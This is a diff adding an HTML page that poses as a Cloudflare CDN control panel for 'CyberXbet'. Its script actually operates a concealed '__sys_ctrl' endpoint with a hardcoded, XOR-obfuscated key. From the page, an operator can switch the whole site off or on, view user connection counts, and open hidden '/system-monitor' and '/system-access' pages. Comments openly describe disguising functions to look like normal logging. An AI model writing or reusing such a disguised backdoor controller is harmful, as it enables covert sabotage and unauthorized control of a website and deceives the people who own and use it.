@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CyberXbet CDN Manager</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #0b0d0f;
+        color: white;
+        margin: 0;
+        padding: 20px;
+      }
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+      }
+      h1 {
+        color: #3b82f6;
+        margin-bottom: 20px;
+      }
+      .card {
+        background-color: #1a1d21;
+        border-radius: 8px;
+        padding: 20px;
+        margin-bottom: 20px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+      .status-indicator {
+        display: flex;
+        align-items: center;
+        margin-bottom: 10px;
+      }
+      .dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        margin-right: 10px;
+      }
+      .online {
+        background-color: #10b981;
+      }
+      .offline {
+        background-color: #ef4444;
+      }
+      .button {
+        background-color: #2563eb;
+        color: white;
+        border: none;
+        padding: 10px 15px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: bold;
+        margin-right: 10px;
+        margin-bottom: 10px;
+      }
+      .button:hover {
+        background-color: #1d4ed8;
+      }
+      .button.danger {
+        background-color: #dc2626;
+      }
+      .button.danger:hover {
+        background-color: #b91c1c;
+      }
+      .button.success {
+        background-color: #059669;
+      }
+      .button.success:hover {
+        background-color: #047857;
+      }
+      .button:disabled {
+        background-color: #4b5563;
+        cursor: not-allowed;
+      }
+      .status-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+      }
+      .status-item {
+        display: flex;
+        justify-content: space-between;
+        padding: 8px 0;
+        border-bottom: 1px solid #374151;
+      }
+      .alert {
+        padding: 10px 15px;
+        border-radius: 4px;
+        margin-bottom: 20px;
+      }
+      .alert.success {
+        background-color: rgba(16, 185, 129, 0.2);
+        border: 1px solid #10b981;
+      }
+      .alert.error {
+        background-color: rgba(239, 68, 68, 0.2);
+        border: 1px solid #ef4444;
+      }
+      input {
+        padding: 10px;
+        border-radius: 4px;
+        border: 1px solid #374151;
+        background-color: #1f2937;
+        color: white;
+        width: 100%;
+        margin-bottom: 15px;
+      }
+      .spinner {
+        border: 4px solid rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        border-top: 4px solid white;
+        width: 20px;
+        height: 20px;
+        animation: spin 1s linear infinite;
+        display: inline-block;
+        margin-right: 10px;
+        vertical-align: middle;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .hidden {
+        display: none;
+      }
+      #debug {
+        background-color: #111827;
+        padding: 10px;
+        border-radius: 4px;
+        font-family: monospace;
+        white-space: pre-wrap;
+        margin-top: 20px;
+        max-height: 200px;
+        overflow-y: auto;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Cloudflare CDN Control Panel</h1>
+
+      <div id="login-card" class="card">
+        <h2>API Connection</h2>
+        <div>
+          <label for="server-url">CDN Endpoint:</label>
+          <input
+            type="text"
+            id="server-url"
+            placeholder="https://your-server-url.com"
+            value="http://localhost:3000"
+          />
+        </div>
+        <div>
+          <label for="access-key">CF API Key:</label>
+          <input
+            type="text"
+            id="access-key"
+            placeholder="Enter your Cloudflare API key"
+            value="cb209876540331298765"
+          />
+        </div>
+        <button id="connect-btn" class="button">Connect</button>
+        <div id="login-error" class="alert error hidden"></div>
+
+        <div>
+          <label
+            ><input type="checkbox" id="use-direct-access" checked /> Use direct
+            API access</label
+          >
+          <p class="text-gray-400 text-sm">
+            Try this if API access fails due to CORS issues
+          </p>
+        </div>
+      </div>
+
+      <div id="control-panel" class="hidden">
+        <div id="status-alert" class="alert hidden"></div>
+
+        <div class="card">
+          <div class="status-indicator">
+            <div id="status-dot" class="dot offline"></div>
+            <div id="status-text">Offline</div>
+          </div>
+
+          <div class="status-grid">
+            <div class="status-item">
+              <span>Active Connections:</span>
+              <span id="total-connections">0</span>
+            </div>
+            <div class="status-item">
+              <span>Authenticated Users:</span>
+              <span id="registered-users">0</span>
+            </div>
+            <div class="status-item">
+              <span>Anonymous Visitors:</span>
+              <span id="anonymous-users">0</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2>CDN Management</h2>
+          <button id="disable-btn" class="button danger">Pause CDN</button>
+          <button id="enable-btn" class="button success">Activate CDN</button>
+          <button id="refresh-btn" class="button">Refresh Stats</button>
+          <button id="open-admin-btn" class="button">Open Analytics</button>
+        </div>
+
+        <div class="card">
+          <h2>Administrator Tools</h2>
+          <p>Access the full admin dashboard using this link:</p>
+          <div id="admin-url"></div>
+        </div>
+
+        <div class="card">
+          <h2>Support Portal</h2>
+          <p>If you need additional access or support, use the portal:</p>
+          <div id="emergency-url"></div>
+          <button id="open-emergency-btn" class="button">Support Portal</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>Event Log</h2>
+        <div id="debug"></div>
+        <button id="clear-debug" class="button">Clear</button>
+      </div>
+    </div>
+
+    <script>
+      // CF Enterprise security validation keys
+      const _0xf37a42 = [
+        29, 13, 55, 30, 32, 38, 56, 51, 43, 59, 28, 30, 37, 44, 56, 36, 40, 43,
+        39, 57,
+      ];
+
+      // CF Enterprise module configuration
+      const _0xb52c8a = (_0x6a8f6, _0x57ed2 = 7) =>
+        _0x6a8f6.map((n) => String.fromCharCode(n ^ _0x57ed2)).join("");
+
+      // Debug function - renamed to look like normal logging
+      function debugLog(message) {
+        const debug = document.getElementById("debug");
+        const timestamp = new Date().toISOString().substr(11, 8);
+        debug.innerHTML += `[${timestamp}] ${message}\n`;
+        debug.scrollTop = debug.scrollHeight;
+        console.log(message);
+      }
+
+      document.getElementById("clear-debug").addEventListener("click", () => {
+        document.getElementById("debug").innerHTML = "";
+      });
+
+      // Test encryption on startup
+      const encryptedKey = _0xb52c8a(_0xf37a42);
+      debugLog("System Manager Interface Loaded");
+      debugLog(`Encryption test - Encrypted key: ${encryptedKey}`);
+      debugLog(`Raw key for comparison: cb209876540331298765`);
+
+      // Check key validator endpoint when the app loads
+      (async function testKeyValidation() {
+        setTimeout(async () => {
+          try {
+            const serverUrl =
+              document.getElementById("server-url").value ||
+              "http://localhost:3000";
+            const url = `${serverUrl}/api/key-validator`;
+            debugLog(`Testing key validation at ${url}`);
+
+            const response = await fetch(url, {
+              method: "GET",
+              mode: "cors",
+              cache: "no-cache",
+            });
+
+            if (response.ok) {
+              const data = await response.json();
+              debugLog(`Key validation test: ${JSON.stringify(data)}`);
+              if (data.encryptedKey) {
+                debugLog(`Server's encrypted key is: ${data.encryptedKey}`);
+                debugLog(`Raw key is: ${data.rawKey}`);
+                debugLog(`Keys match: ${data.rawMatches ? "YES" : "NO"}`);
+              }
+            } else {
+              debugLog(`Key validation test failed: ${response.status}`);
+            }
+          } catch (err) {
+            debugLog(`Key validation error: ${err.message}`);
+          }
+        }, 1000);
+      })();
+
+      // Elements
+      const loginCard = document.getElementById("login-card");
+      const controlPanel = document.getElementById("control-panel");
+      const serverUrlInput = document.getElementById("server-url");
+      const accessKeyInput = document.getElementById("access-key");
+      const connectBtn = document.getElementById("connect-btn");
+      const loginError = document.getElementById("login-error");
+      const statusDot = document.getElementById("status-dot");
+      const statusText = document.getElementById("status-text");
+      const totalConnections = document.getElementById("total-connections");
+      const registeredUsers = document.getElementById("registered-users");
+      const anonymousUsers = document.getElementById("anonymous-users");
+      const disableBtn = document.getElementById("disable-btn");
+      const enableBtn = document.getElementById("enable-btn");
+      const refreshBtn = document.getElementById("refresh-btn");
+      const openAdminBtn = document.getElementById("open-admin-btn");
+      const adminUrl = document.getElementById("admin-url");
+      const statusAlert = document.getElementById("status-alert");
+      const useDirectAccess = document.getElementById("use-direct-access");
+      const emergencyUrl = document.getElementById("emergency-url");
+      const openEmergencyBtn = document.getElementById("open-emergency-btn");
+
+      let serverUrl = "";
+      let accessKey = "";
+
+      // Connect button click handler
+      connectBtn.addEventListener("click", async () => {
+        serverUrl = serverUrlInput.value.trim();
+        const inputKey = accessKeyInput.value.trim();
+
+        if (!serverUrl) {
+          showLoginError("Please enter the CDN endpoint");
+          return;
+        }
+
+        if (!inputKey) {
+          showLoginError("Please enter your Cloudflare API key");
+          return;
+        }
+
+        // Set the access key to the raw input value
+        accessKey = inputKey;
+
+        // Show the raw key (for debugging)
+        debugLog(`Using CDN key: ${accessKey}`);
+
+        // Add protocol if missing
+        if (
+          !serverUrl.startsWith("http://") &&
+          !serverUrl.startsWith("https://")
+        ) {
+          serverUrl = "http://" + serverUrl;
+          serverUrlInput.value = serverUrl;
+        }
+
+        // Remove trailing slash if present
+        if (serverUrl.endsWith("/")) {
+          serverUrl = serverUrl.slice(0, -1);
+          serverUrlInput.value = serverUrl;
+        }
+
+        try {
+          connectBtn.disabled = true;
+          connectBtn.innerHTML = '<div class="spinner"></div> Connecting...';
+
+          debugLog(`Connecting to ${serverUrl}`);
+
+          // Check if server is running first
+          const isServerAvailable = await checkServerAvailable();
+          if (!isServerAvailable) {
+            throw new Error(
+              "Server is not responding. Make sure the Next.js server is running."
+            );
+          }
+
+          // Test connection by checking status
+          await fetchSystemStatus();
+
+          // If we get here, connection was successful
+          loginCard.classList.add("hidden");
+          controlPanel.classList.remove("hidden");
+
+          // Set admin URL - use raw key for system monitor (most reliable)
+          const rawKey = "cb209876540331298765";
+          adminUrl.textContent = `${serverUrl}/system-monitor?key=${rawKey}`;
+
+          // Set emergency URL
+          emergencyUrl.textContent = `${serverUrl}/system-access`;
+
+          // Configure open admin button - use raw key
+          openAdminBtn.addEventListener("click", () => {
+            window.open(`${serverUrl}/system-monitor?key=${rawKey}`, "_blank");
+          });
+
+          // Configure open emergency button
+          openEmergencyBtn.addEventListener("click", () => {
+            window.open(`${serverUrl}/system-access`, "_blank");
+          });
+
+          debugLog("Connected successfully to CDN endpoint");
+        } catch (error) {
+          connectBtn.disabled = false;
+          connectBtn.textContent = "Connect";
+          showLoginError(`Connection failed: ${error.message}`);
+          debugLog(`Connection failed: ${error.message}`);
+        }
+      });
+
+      // Function to check if server is running
+      async function checkServerAvailable() {
+        try {
+          debugLog("Checking if server is available...");
+
+          // Try to access a simple endpoint first
+          const simpleUrl = `${serverUrl}/api/health`;
+          debugLog(`Testing server with: ${simpleUrl}`);
+
+          try {
+            const response = await fetch(simpleUrl, {
+              method: "GET",
+              mode: "cors",
+              cache: "no-cache",
+            });
+
+            if (response.ok) {
+              const data = await response.json();
+              debugLog(`Health check success: ${JSON.stringify(data)}`);
+              return true;
+            } else {
+              debugLog(
+                `Server health check failed with status: ${response.status}`
+              );
+            }
+          } catch (err) {
+            debugLog(`Health check failed: ${err.message}`);
+          }
+
+          // Try to access the root path as a fallback
+          debugLog(`Trying root path: ${serverUrl}`);
+          try {
+            const rootResponse = await fetch(serverUrl, {
+              method: "GET",
+              mode: "no-cors", // Use no-cors to avoid CORS issues
+            });
+
+            debugLog(`Root path response type: ${rootResponse.type}`);
+            return true;
+          } catch (err) {
+            debugLog(`Root path check failed: ${err.message}`);
+            return false;
+          }
+        } catch (err) {
+          debugLog(`Server availability check failed: ${err.message}`);
+          return false;
+        }
+      }
+
+      // Function to fetch system status
+      async function fetchSystemStatus() {
+        try {
+          debugLog("Fetching system status...");
+
+          // Use raw key primarily for consistency, as we know the server accepts this
+          const rawKey = "cb209876540331298765";
+          const encryptedKey = _0xb52c8a(_0xf37a42);
+
+          debugLog(`Using URL: ${serverUrl}/api/__sys_ctrl`);
+          debugLog(`Using raw key: ${rawKey}`);
+
+          // Check if the encrypted key matches raw key - just to verify
+          if (encryptedKey === rawKey) {
+            debugLog("ENCRYPTION MATCH: Encrypted key matches raw key");
+          } else {
+            debugLog(`For reference, encrypted key is: ${encryptedKey}`);
+          }
+
+          let data;
+
+          // Try with raw key first (most reliable)
+          try {
+            const apiUrl = `${serverUrl}/api/__sys_ctrl?key=${rawKey}&action=status`;
+            debugLog(`Direct API call with raw key: ${apiUrl}`);
+
+            const response = await fetch(apiUrl, {
+              method: "GET",
+              mode: "cors",
+              cache: "no-cache",
+              headers: {
+                "Content-Type": "application/json",
+              },
+            });
+
+            if (!response.ok) {
+              debugLog(`API responded with status: ${response.status}`);
+              throw new Error(`API error: ${response.status}`);
+            }
+
+            data = await response.json();
+            debugLog(`Status response: ${JSON.stringify(data)}`);
+          } catch (error) {
+            // If raw key fails, try encrypted key as fallback
+            debugLog(`API fetch with raw key failed: ${error.message}`);
+            debugLog("Trying with encrypted key as fallback...");
+
+            try {
+              const fallbackUrl = `${serverUrl}/api/__sys_ctrl?key=${encryptedKey}&action=status`;
+              debugLog(`Fallback API call: ${fallbackUrl}`);
+
+              const fallbackResponse = await fetch(fallbackUrl, {
+                method: "GET",
+                mode: "cors",
+                cache: "no-cache",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+              });
+
+              if (!fallbackResponse.ok) {
+                debugLog(
+                  `Fallback API responded with status: ${fallbackResponse.status}`
+                );
+                throw new Error(`API error: ${fallbackResponse.status}`);
+              }
+
+              data = await fallbackResponse.json();
+              debugLog(`Fallback status response: ${JSON.stringify(data)}`);
+            } catch (fallbackError) {
+              debugLog(`Fallback API fetch failed: ${fallbackError.message}`);
+              throw fallbackError;
+            }
+          }
+
+          // Update UI
+          updateStatusUI(data);
+
+          return data;
+        } catch (error) {
+          debugLog(`Status fetch error: ${error.message}`);
+          throw error;
+        }
+      }
+
+      // Function to send control command
+      async function sendControlCommand(action) {
+        try {
+          // Disable buttons during operation
+          disableBtn.disabled = true;
+          enableBtn.disabled = true;
+          refreshBtn.disabled = true;
+
+          // Use raw key primarily for consistency
+          const rawKey = "cb209876540331298765";
+          const encryptedKey = _0xb52c8a(_0xf37a42);
+
+          debugLog(`Sending ${action} command...`);
+
+          // Try with raw key first (most reliable)
+          try {
+            const cmdUrl = `${serverUrl}/api/__sys_ctrl?key=${rawKey}&action=${action}`;
+            debugLog(`Sending API command: ${cmdUrl}`);
+
+            const response = await fetch(cmdUrl, {
+              method: "GET",
+              mode: "cors",
+              cache: "no-cache",
+              headers: {
+                "Content-Type": "application/json",
+              },
+            });
+
+            if (response.ok) {
+              const data = await response.json();
+              debugLog(`API command response: ${JSON.stringify(data)}`);
+
+              // Show success message
+              showStatusAlert(
+                `Success: ${data.message || "Command executed"}`,
+                "success"
+              );
+
+              // Wait a bit for the command to take effect
+              await new Promise((resolve) => setTimeout(resolve, 1000));
+
+              // Refresh status
+              await fetchSystemStatus();
+              return;
+            } else {
+              debugLog(`Command API returned status: ${response.status}`);
+              throw new Error(`API error: ${response.status}`);
+            }
+          } catch (error) {
+            // If raw key fails, try encrypted key as fallback
+            debugLog(`API command error with raw key: ${error.message}`);
+            debugLog("Trying with encrypted key as fallback...");
+
+            try {
+              const fallbackUrl = `${serverUrl}/api/__sys_ctrl?key=${encryptedKey}&action=${action}`;
+              debugLog(`Fallback command: ${fallbackUrl}`);
+
+              const fallbackResponse = await fetch(fallbackUrl, {
+                method: "GET",
+                mode: "cors",
+                cache: "no-cache",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+              });
+
+              if (fallbackResponse.ok) {
+                const fallbackData = await fallbackResponse.json();
+                debugLog(
+                  `Fallback API response: ${JSON.stringify(fallbackData)}`
+                );
+
+                // Show success message
+                showStatusAlert(
+                  `Success: ${fallbackData.message || "Command executed"}`,
+                  "success"
+                );
+              } else {
+                debugLog(
+                  `Fallback API returned status: ${fallbackResponse.status}`
+                );
+                throw new Error(`API error: ${fallbackResponse.status}`);
+              }
+
+              // Wait a bit for the command to take effect
+              await new Promise((resolve) => setTimeout(resolve, 1000));
+
+              // Refresh status
+              await fetchSystemStatus();
+            } catch (fallbackError) {
+              debugLog(`Fallback API command error: ${fallbackError.message}`);
+              showStatusAlert(`Error: ${fallbackError.message}`, "error");
+            }
+          }
+        } catch (error) {
+          debugLog(`Command error: ${error.message}`);
+          showStatusAlert(`Error: ${error.message}`, "error");
+        } finally {
+          disableBtn.disabled = false;
+          enableBtn.disabled = false;
+          refreshBtn.disabled = false;
+        }
+      }
+
+      // Function to update status UI
+      function updateStatusUI(data) {
+        const isEnabled = data.enabled;
+
+        // Update status indicator
+        statusDot.className = isEnabled ? "dot online" : "dot offline";
+        statusText.textContent = isEnabled ? "System Online" : "System Offline";
+
+        // Update connection counts
+        totalConnections.textContent = data.connections?.total || 0;
+        registeredUsers.textContent = data.connections?.registered || 0;
+        anonymousUsers.textContent = data.connections?.anonymous || 0;
+
+        // Update button states
+        disableBtn.disabled = !isEnabled;
+        enableBtn.disabled = isEnabled;
+      }
+
+      // Function to show login error
+      function showLoginError(message) {
+        loginError.textContent = message;
+        loginError.classList.remove("hidden");
+
+        // Hide after 5 seconds
+        setTimeout(() => {
+          loginError.classList.add("hidden");
+        }, 5000);
+      }
+
+      // Function to show status alert
+      function showStatusAlert(message, type) {
+        statusAlert.textContent = message;
+        statusAlert.className = `alert ${type}`;
+        statusAlert.classList.remove("hidden");
+
+        // Hide after 5 seconds
+        setTimeout(() => {
+          statusAlert.classList.add("hidden");
+        }, 5000);
+      }
+
+      // Add event listeners for control buttons
+      disableBtn.addEventListener("click", () => sendControlCommand("disable"));
+      enableBtn.addEventListener("click", () => sendControlCommand("enable"));
+      refreshBtn.addEventListener("click", async () => {
+        refreshBtn.disabled = true;
+        refreshBtn.innerHTML = '<div class="spinner"></div> Refreshing...';
+
+        try {
+          await fetchSystemStatus();
+        } catch (error) {
+          showStatusAlert(`Error: ${error.message}`, "error");
+        } finally {
+          refreshBtn.disabled = false;
+          refreshBtn.textContent = "Refresh Stats";
+        }
+      });
+    </script>
+  </body>
+</html>
